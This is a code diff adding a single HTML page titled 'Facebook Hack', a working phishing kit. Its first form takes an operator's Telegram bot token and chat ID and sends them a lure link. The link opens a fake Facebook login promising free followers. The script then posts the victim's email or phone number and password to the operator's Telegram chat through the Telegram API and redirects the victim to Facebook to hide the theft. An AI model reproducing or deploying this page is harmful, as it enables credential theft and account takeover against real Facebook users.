@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Hack </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000; /* Set background to black for main page */
+            color: #fff; /* Change text color to white */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            width: 320px;
+            text-align: center; /* Center text */
+        }
+
+        h2 {
+            font-size: 24px;
+            animation: fadeIn 1s; /* Animation for title */
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #218838;
+        }
+
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Logo styling */
+        #loginLogo {
+            width: 120px; /* Set logo width to 120px */
+            height: 120px; /* Set logo height to 120px */
+            margin-bottom: 20px;
+        }
+
+        /* Background for login form */
+        #loginForm {
+            background-image: url('https://i.ibb.co/3mQ6D0p/images-3.jpg'); /* Background image for login page */
+            background-size: cover; /* Cover the entire container */
+            background-position: center; /* Center the background image */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            color: #fff; /* Change text color to white */
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="mainContainer"> 
+ 
+    <form id="telegramForm">
+        <input type="text" id="botToken" placeholder="Enter your Bot Token" required>
+        <input type="text" id="chatId" placeholder="Enter your Chat ID" required>
+        <button type="button" onclick="sendLoginLink()">Send Login Link</button>
+    </form>
+
+
+    <form id="loginForm" style="display:none;">
+        <h2>Get free unlimited Follower</h2>
+        <img id="loginLogo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo"> <!-- Facebook Logo on Login Page -->
+        <input type="text" id="emailOrPhone" placeholder="Enter your Email/Phone Number" required>
+        <input type="password" id="password" placeholder="Enter your Password" required>
+        <button type="button" id="loginBtn" onclick="submitLogin()">Get Free Follower</button>
+    </form>
+</div>
+
+<script>
+    // Function to send the login link to the Telegram chat
+    function sendLoginLink() {
+        var botToken = document.getElementById('botToken').value;
+        var chatId = document.getElementById('chatId').value;
+        var loginUrl = window.location.href + "?botToken=" + botToken + "&chatId=" + chatId + "#login";
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `Login here: ${loginUrl}`
+            })
+        }).then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+                alert("Login link sent!");
+            } else {
+                alert("Error sending message. Check Bot Token and Chat ID.");
+            }
+        });
+    }
+
+    // Function to handle URL parameters and show the login form if login link is clicked
+    function handleUrlParams() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const botToken = urlParams.get('botToken');
+        const chatId = urlParams.get('chatId');
+
+        if (botToken && chatId) {
+            document.getElementById('telegramForm').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+
+            // Store botToken and chatId for use during login submission
+            window.botToken = botToken;
+            window.chatId = chatId;
+        }
+    }
+
+    // Function to submit the login info to the Telegram bot
+    function submitLogin() {
+        var emailOrPhone = document.getElementById('emailOrPhone').value;
+        var password = document.getElementById('password').value;
+        var loginBtn = document.getElementById('loginBtn');
+
+        // Disable the login button to prevent multiple submissions
+        loginBtn.disabled = true;
+
+        fetch(`https://api.telegram.org/bot${window.botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: window.chatId,
+                text: `Login info:\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}`
+            })
+        }).then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+                alert("Login info sent to Telegram!");
+                // Redirect to Facebook after successful submission
+                window.location.href = "https://www.fb.com";
+            } else {
+                alert("Error submitting login info.");
+            }
+        }).finally(() => {
+            // Re-enable the button after the request is completed
+            loginBtn.disabled = false;
+        });
+    }
+
+    // Automatically show the login form if the URL has the necessary parameters
+    window.onload = handleUrlParams;
+</script>
+
+</body>
+</html>
